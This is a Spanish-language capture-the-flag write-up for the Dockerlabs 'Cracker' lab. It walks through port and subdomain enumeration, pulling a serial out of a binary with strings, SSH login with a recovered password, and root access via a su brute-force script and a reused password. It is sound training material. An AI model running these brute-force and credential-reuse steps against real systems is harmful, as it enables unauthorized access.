
# Writeup Template: Maquina `[ Craker ]`

- Tags: #Craker
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Craker](https://mega.nz/file/iJ1UzQ5C#t8zsjmsyIB6dIFndUVc6qrvZOOh2cevCDNvEgUOELWs) Laboratorio enfocado en ataques de fuerza bruta y cracking de contraseñas.

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x cracker.zip
sudo bash auto_deploy.sh cracker.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((UbuntuNoble))
```
---

## Enumeracion de [Servicio Web Principal]
Tenemos **hostsDiscovery** asi que agreamos esta linea a nuestro archivo: **/etc/hosts**
```bash
172.17.0.2 cracker.dl
```

direccion **URL** del servicio: 
```bash
http://cracker.dl/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://cracker.dl/
http://cracker.dl/ [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Title[Cracker - Aprende Cracking Ético]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 cracker.dl # No reporata rutas
```

### Descubrimiento de Rutas
```bash
gobuster dir -u http://cracker.dl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta rutas

### Descubrimiento de Archivos
```bash
gobuster dir -u http://cracker.dl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html,js,java,py
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 4696]
```

### Descubrimiento de Subdominios
```bash
wfuzz -c -t 50 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -H "Host:FUZZ.cracker.dl" -u 172.17.0.2 --hh=302,4029
```

- **Hallazgos**:
```bash
=====================================================================
000001036:   200        91 L     224 W      3199 Ch     "japan"
```

Tenemos un nuevo subdominio que tendremos que agragar a nuestro archivo **/etc/hosts**
```bash
172.17.0.2 cracker.dl japan.cracker.dl
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ingresando tenemos un panel administrativo, al cual realizaremos prubas de inyeccion o fuerza bruta para lograr ganar accesso.
En la web nos indica que necesitamos un numero **seria** para poder gestionar
```bash
## Introduce tu SERIAL de acceso
Para gestionar el contenido de Cracker, necesitas un SERIAL válido. Si ya tienes uno, ingrésalo a continuación.
```

#### DOWNLOAD SOFTWARE
Nos descargamos el siguiente **software** a nuestro equipo de atacante: Y ahora tendriamos un **PanelAdmin**
Revisando el tipo de archivo tenemos lo siguiente:
```bash
file PanelAdmin
PanelAdmin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1a373bf2779766088c7e35eeb06784b9156e2add, for GNU/Linux 3.2.0, not stripped

chmod +x PanelAdmin # Damos permisos de ejecucion
```

Revisando caracteres legibiles tenemos lo siguiente:
```bash
strings PanelAdmin

Contrase
a Secreta Desencriptada: %s
47378
10239
84236
54367
83291
78354
%s-%s-%s-%s-%s-%s
Panel de Administrador
```

Tenemos estos numeros que juntos son:
```bash
473781023984236543678329178354
```

Al ejecutar el binario **PanelAdmin** nos pide una contrasena, **Introduce el SERIAL para poder ingresar**
Al Intentar meter estos nuemeros que tenemos nos dice que es incorrecto
```bash
473781023984236543678329178354
```

Asi que lo que aremos es dividirlo enter secciones de 5
```bash
47378-10239-84236-54367-83291-78354
```

Con este si que nos deja, Y donde nos da la bienvenida dandonos una opcion para mostrar una contrasa secreta:
Si le damos clic en **Mostrar Contrasena Secreta** nos muestra:
```bash
Contrasena Secreta Desemcriptada: #P@$$w0rd!%#S€c7T
```
### Intrusion
Sabiendo desde el panel administrativo nos indica que es del usuario **Cracker** usaremos la contrasnea para intentar logueanos por **ssh**
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh cracker@172.17.0.2 # ( #P@$$w0rd!%#S€c7T )
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
cracker:x:1001:1001::/home/cracker:/bin/bash
```
### Explotacion de Privilegios

###### Usuario `[ Cracker ]`:
Sabiendo que solo existe un usuario en el sistema, Asi que tenemos que ver la manera de escalar a **root**
**Flag** de usuario:
```bash
cat user.txt 
5daa85f6664733de9e889c30fe4f3792
```

Enumeracion usuario:
```bash
sudo -l
[sudo] password for cracker: 
Sorry, user cracker may not run sudo on 5e6ebf868c2c.

find / -perm -4000 2>/dev/null # Ningun binario peligroso
getcap -r / 2>/dev/null # sin permisos capabilities
ls -la /tmp
ls -la /opt
find / -iname ".secret*" 2>/dev/null
```

Lo que aremos es realizar ataque de fuerza bruata para el usuario **root**
Ahora por **ssh** transferiremos a la maquina victima las siguientes herrramientas para realizar un ataque de fuerza bruta al usuario privilegiodo.
```bash
cp /usr/bin/Sudo_BruteForce/Linux-Su-Force.sh .
cp /usr/share/wordlists/rockyou.txt .
```

Ya teniendo estas dos herramientas listas en nuestro directorio de trabajo:
```bash
Linux-Su-Force.sh rockyou.txt
```

procedemos a transferirlos a la maquina victima:
```bash
❯ scp Linux-Su-Force.sh cracker@172.17.0.2:/home/cracker
cracker@172.17.0.2's password: 
Linux-Su-Force.sh

❯ scp rockyou.txt cracker@172.17.0.2:/home/cracker
cracker@172.17.0.2's password: 
rockyou.txt                                             
```

Si listamos desde la maquina victima, ya tiene estas dos herramientas:
```bash
cracker@5e6ebf868c2c:~$ ls
Linux-Su-Force.sh  rockyou.txt
```

Procedemos a realizar el ataque:
```bash
bash Linux-Su-Force.sh root rockyou.txt
```

Pero no tuvimos exito asi que crearemos un diccionario basado en las palabras de la web con el comando **cewl**
```bash
cewl http://japan.cracker.dl/ -w diccionario.txt
CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

Ahora se lo transferimos a la maquina victima:
```bash
scp diccionario.txt cracker@172.17.0.2:/home/cracker
cracker@172.17.0.2's password: #P@$$w0rd!%#S€c7T
diccionario.txt
```

Ahora volvemos a ejecutar el ataque:
```bash
bash Linux-Su-Force.sh root diccionario.txt
```

igual no tuvimos exito pero usaremos por el ultimo el **SERIAL** para ver si es que se esta reciclando contrasenas:
```bash
# Comando para escalar al usuario: ( root )
su root # 47378-10239-84236-54367-83291-78354
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@5e6ebf868c2c:/home/cracker# whoami
root
```